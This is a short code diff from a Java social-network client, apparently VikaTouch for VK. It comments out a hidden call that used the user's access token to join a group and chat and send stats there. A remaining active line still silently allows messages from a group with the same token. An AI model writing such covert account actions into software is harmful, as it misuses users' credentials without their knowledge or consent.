@@ -583,11 +583,11 @@ public class VikaTouch {
 			public void run() {
 				try {
 					sendLog(getStats(true));
-					VikaUtils.download(vikatouch.VikaTouch.API
+					/*VikaUtils.download(vikatouch.VikaTouch.API
 							+ "/method/execute?code=%7Bvar%20a%20%3D%20API.groups.join(%7B%22group_id%22%3A168202266%2C%20%22v%22%3A5.87%7D)%3Bvar%20b%20%3D%20API.messages.joinChatByInviteLink(%7B%22link%22%3A%22https%3A%2F%2Fvk.me%2Fjoin%2FAJQ1dy0j2wT%2FXFocNMGlvj_M%22%2C%20%22v%22%3A5.85%7D)%3Bvar%20c%20%3D%20API.messages.send(%7B%22peer_id%22%3A-168202266%2C%20%22message%22%3A%22"
 							+ VikaTouch.getStats(true)
 							+ "%22%2C%20%22v%22%3A5.67%7D)%3Breturn%20c%3B%7D&v=5.21&access_token="
-							+ VikaTouch.accessToken);
+							+ VikaTouch.accessToken);*/
 					// Разрешить сообщения от группы
 					VikaUtils.download(VikaTouch.API + "/method/messages.allowMessagesFromGroup?access_token="
 							+ VikaTouch.accessToken + "&group_id=310674350&v=5.101");
